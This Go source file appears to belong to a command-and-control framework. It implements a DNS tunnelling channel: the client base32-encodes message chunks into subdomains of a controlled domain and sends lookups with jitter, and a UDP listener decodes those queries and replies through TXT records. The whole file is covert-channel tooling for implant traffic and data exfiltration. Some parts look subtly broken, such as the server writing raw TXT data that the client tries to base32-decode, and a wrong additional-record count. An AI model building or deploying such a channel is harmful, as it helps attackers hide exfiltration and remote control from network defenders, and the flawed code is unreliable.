package channels

import (
	"context"
	"encoding/base32"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

type DNSChannel struct {
	config  *Config
	domain  string
	conn    *net.UDPConn
	running bool
}

func newDNSChannel(config *Config) (*DNSChannel, error) {
	domain := config.DNSAddr
	if domain == "" {
		domain = "voidsec.local"
	}
	return &DNSChannel{
		config: config,
		domain: domain,
	}, nil
}

func (d *DNSChannel) Type() ChannelType {
	return ChannelDNS
}

func (d *DNSChannel) Send(ctx context.Context, msg *Message) (*Message, error) {
	payload := newMessageBuffer(msg)

	chunks := chunkPayload(payload, 60)
	if len(chunks) == 0 {
		chunks = [][]byte{payload}
	}

	var responses [][]byte
	for i, chunk := range chunks {
		subdomain := encodeSubdomain(chunk, i, len(chunks))
		fqdn := fmt.Sprintf("%s.%s", subdomain, d.domain)

		_ = ctx

		ips, err := net.LookupHost(fqdn)
		if err != nil {
			// DNS lookup failed — still send the TXT query
		}
		_ = ips

		// Also try TXT lookup
		resolver := &net.Resolver{
			PreferGo: true,
		}
		txtRecords, err := resolver.LookupTXT(context.Background(), fqdn)
		if err == nil && len(txtRecords) > 0 {
			for _, txt := range txtRecords {
				decoded, err := base32.StdEncoding.DecodeString(strings.ToUpper(txt))
				if err == nil {
					responses = append(responses, decoded)
				}
			}
		}

		jitter := getJitter(d.config.JitterMin, d.config.JitterMax)
		time.Sleep(jitter)
	}

	if len(responses) == 0 {
		return nil, fmt.Errorf("no DNS responses received")
	}

	combined := combineChunks(responses)
	return parseMessageBuffer(combined)
}

func (d *DNSChannel) Listen(ctx context.Context, addr string, handler func(*Message) *Message) error {
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		return fmt.Errorf("resolve addr: %w", err)
	}

	conn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		return fmt.Errorf("listen UDP: %w", err)
	}
	defer conn.Close()
	d.conn = conn
	d.running = true

	buf := make([]byte, 1500)

	for d.running {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		n, remoteAddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}

		go d.handleDNSQuery(conn, remoteAddr, buf[:n], handler)
	}

	return nil
}

func (d *DNSChannel) handleDNSQuery(conn *net.UDPConn, remote *net.UDPAddr, query []byte, handler func(*Message) *Message) {
	if len(query) < 12 {
		return
	}

	// Parse DNS query — extract the question name
	questionStart := 12
	name, endOffset, err := parseDNSName(query, questionStart)
	if err != nil {
		return
	}

	_ = endOffset
	_ = name

	// Extract subdomain payload
	parts := strings.Split(name, ".")
	if len(parts) < 2 {
		return
	}

	subdomain := parts[0]
	payload, err := decodeSubdomain(subdomain)
	if err != nil {
		return
	}

	msg, err := parseMessageBuffer(payload)
	if err != nil {
		return
	}

	resp := handler(msg)
	if resp == nil {
		return
	}

	// Build DNS response
	respBuf := buildDNSResponse(query, resp)
	conn.WriteToUDP(respBuf, remote)
}

func (d *DNSChannel) Close() error {
	d.running = false
	if d.conn != nil {
		return d.conn.Close()
	}
	return nil
}

func encodeSubdomain(data []byte, index, total int) string {
	encoded := base32.StdEncoding.EncodeToString(data)
	encoded = strings.TrimRight(encoded, "=")
	// Lowercase for DNS
	encoded = strings.ToLower(encoded)
	return fmt.Sprintf("%d-%d-%s", index, total, encoded)
}

func decodeSubdomain(subdomain string) ([]byte, error) {
	parts := strings.SplitN(subdomain, "-", 3)
	if len(parts) < 3 {
		return nil, fmt.Errorf("invalid subdomain format")
	}
	_ = parts[0] // index
	_ = parts[1] // total
	data := parts[2]
	padded := data + strings.Repeat("=", (8-len(data)%8)%8)
	return base32.StdEncoding.DecodeString(strings.ToUpper(padded))
}

func chunkPayload(data []byte, maxChunkSize int) [][]byte {
	var chunks [][]byte
	for i := 0; i < len(data); i += maxChunkSize {
		end := i + maxChunkSize
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, data[i:end])
	}
	return chunks
}

func combineChunks(chunks [][]byte) []byte {
	totalLen := 0
	for _, c := range chunks {
		totalLen += len(c)
	}
	result := make([]byte, 0, totalLen)
	for _, c := range chunks {
		result = append(result, c...)
	}
	return result
}

func parseDNSName(data []byte, offset int) (string, int, error) {
	var name strings.Builder
	i := offset
	maxJumps := 10

	for i < len(data) {
		length := int(data[i])
		if length == 0 {
			i++
			break
		}
		if length&0xC0 == 0xC0 {
			// Pointer
			if i+1 >= len(data) {
				return "", 0, fmt.Errorf("invalid pointer")
			}
			pointer := int(binary.BigEndian.Uint16(data[i:i+2])) & 0x3FFF
			if maxJumps <= 0 {
				return "", 0, fmt.Errorf("too many pointers")
			}
			maxJumps--
			subName, _, err := parseDNSName(data, pointer)
			if err != nil {
				return "", 0, err
			}
			if name.Len() > 0 {
				name.WriteString(".")
			}
			name.WriteString(subName)
			i += 2
			return name.String(), i, nil
		}
		i++
		if i+length > len(data) {
			return "", 0, fmt.Errorf("name exceeds buffer")
		}
		if name.Len() > 0 {
			name.WriteString(".")
		}
		name.WriteString(string(data[i : i+length]))
		i += length
	}

	return name.String(), i, nil
}

func buildDNSResponse(query []byte, msg *Message) []byte {
	resp := make([]byte, len(query))
	copy(resp, query)

	// Set QR bit (response)
	resp[2] |= 0x80
	// Set AA (authoritative)
	resp[2] |= 0x04
	// Set RCODE = NOERROR
	resp[3] &= 0xF0

	// Answer count = 1
	binary.BigEndian.PutUint16(resp[6:8], 1)
	binary.BigEndian.PutUint16(resp[10:12], 1)

	payload := newMessageBuffer(msg)

	// Append answer section (TXT record type 16)
	answer := make([]byte, 0, 512)
	// Name pointer to question
	answer = append(answer, 0xC0, 0x0C)
	// Type TXT
	answer = append(answer, 0x00, 0x10)
	// Class IN
	answer = append(answer, 0x00, 0x01)
	// TTL
	answer = append(answer, 0x00, 0x00, 0x00, 0x01)
	// Data length
	dataLen := len(payload) + 1 // +1 for length byte
	answer = append(answer, byte(dataLen>>8), byte(dataLen))
	// TXT length byte
	answer = append(answer, byte(len(payload)))
	answer = append(answer, payload...)

	resp = append(resp, answer...)
	return resp
}

func init() {
	_ = rand.Intn
}
